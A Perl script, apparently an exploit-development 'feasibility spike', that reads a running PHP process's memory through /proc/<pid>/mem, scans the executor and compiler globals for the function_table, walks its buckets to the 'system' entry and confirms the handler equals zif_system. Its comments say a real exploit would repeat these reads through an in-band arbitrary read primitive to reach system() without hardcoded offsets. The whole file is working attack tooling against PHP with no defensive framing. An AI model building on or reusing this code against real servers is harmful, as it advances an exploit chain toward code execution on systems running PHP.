#!/usr/bin/perl
# A2 feasibility spike — prove an offset-free data path to zif_system exists.
# Anchor: executor_globals / compiler_globals (both exported in .dynsym, so
# resolvable in-band). From there, SCAN for the function_table HashTable
# (no hardcoded field offset), walk to "system", read its handler, and check
# it equals the ground-truth zif_system. If it matches, the in-band exploit
# can follow the exact same reads.
#
# Uses /proc/<pid>/mem ONLY as a feasibility oracle for this spike — the real
# exploit would perform these same reads via the in-band arbitrary read.
use strict; use warnings; no warnings 'portable';
use POSIX qw(SEEK_SET);

my ($pid, $base) = @ARGV;
$base = hex($base) if $base =~ /^0x/;
my $EG  = $base + 0x132d340;   # executor_globals  (from .dynsym — resolvable in-band)
my $CG  = $base + 0x132db00;   # compiler_globals  (from .dynsym — resolvable in-band)
my $ZIF = $base + 0x465370;    # zif_system GROUND TRUTH (what we must arrive at)
my $TXT_LO = $base;            # libphp mapping (rough .text range for handler sanity)
my $TXT_HI = $base + 0x1000000;

open(my $M, "<", "/proc/$pid/mem") or die "open mem: $!";
sub rd { my ($a,$n)=@_; sysseek($M,$a,SEEK_SET) or return undef;
         my $b=""; my $g=sysread($M,$b,$n); return (defined $g && $g==$n)?$b:undef; }
sub u64 { my $b=rd($_[0],8); return undef unless defined $b; unpack("Q<",$b); }
sub u32 { my $b=rd($_[0],4); return undef unless defined $b; unpack("V",$b); }

printf "base=0x%x  EG=0x%x  CG=0x%x  zif_system(truth)=0x%x\n",$base,$EG,$CG,$ZIF;

# Validate a candidate pointer as the function_table HashTable.
sub looks_like_ftable {
    my $ht = shift;
    return 0 unless $ht && $ht > 0x1000 && $ht < 0x800000000000;
    my $arData  = u64($ht + 0x10);
    my $nUsed   = u32($ht + 0x18);
    my $nSize   = u32($ht + 0x20);
    return 0 unless defined $arData && defined $nUsed && defined $nSize;
    return 0 unless $arData > 0x1000 && $arData < 0x800000000000;
    return 0 unless $nUsed >= 200 && $nUsed <= 200000;      # function table is big
    return 0 unless $nSize >= $nUsed;
    return 0 unless ($nSize & ($nSize-1)) == 0;             # power of two
    return ($arData, $nUsed);
}

# Walk a function_table's buckets for key "system"; return the zend_function*.
sub find_system {
    my ($arData,$nUsed) = @_;
    for (my $i=0; $i<$nUsed; $i++) {
        my $bk = $arData + $i*0x20;         # Bucket = {zval val; ulong h; zend_string* key}
        my $key = u64($bk + 0x18);
        next unless $key && $key > 0x1000 && $key < 0x800000000000;
        my $len = u64($key + 0x10);
        next unless defined $len && $len == 6;   # "system"
        my $s = rd($key + 0x18, 6);
        next unless defined $s && $s eq "system";
        my $func = u64($bk + 0x00);         # zval.value.ptr (IS_PTR func entry)
        return $func;
    }
    return undef;
}

my $found = 0;
for my $anchor (["executor_globals",$EG,1960], ["compiler_globals",$CG,616]) {
    my ($name,$addr,$size) = @$anchor;
    my $blob = rd($addr,$size);
    unless (defined $blob) { printf "[%s] unreadable\n",$name; next; }
    printf "[%s] scanning %d bytes for function_table pointer...\n",$name,$size;
    for (my $off=0; $off+8<=$size; $off+=8) {
        my $cand = unpack("Q<",substr($blob,$off,8));
        my ($arData,$nUsed) = looks_like_ftable($cand);
        next unless $arData;
        my $func = find_system($arData,$nUsed);
        next unless defined $func && $func>0x1000;
        # scan the function struct for the handler == zif_system
        my $fblob = rd($func, 0x80);
        next unless defined $fblob;
        for (my $fo=0; $fo+8<=0x80; $fo+=8) {
            my $h = unpack("Q<",substr($fblob,$fo,8));
            if ($h == $ZIF) {
                printf "  [MATCH] %s+0x%x -> function_table=0x%x (nUsed=%d) -> system func=0x%x -> handler\@+0x%x == zif_system 0x%x\n",
                    $name,$off,$cand,$nUsed,$func,$fo,$h;
                $found=1;
            }
        }
    }
}
printf "\nRESULT: %s\n", $found
  ? "A2 PATH EXISTS — reached zif_system from a dynsym-exported global with no hardcoded zif offset (only struct-walking)."
  : "no offset-free path found via globals scan.";
close $M;
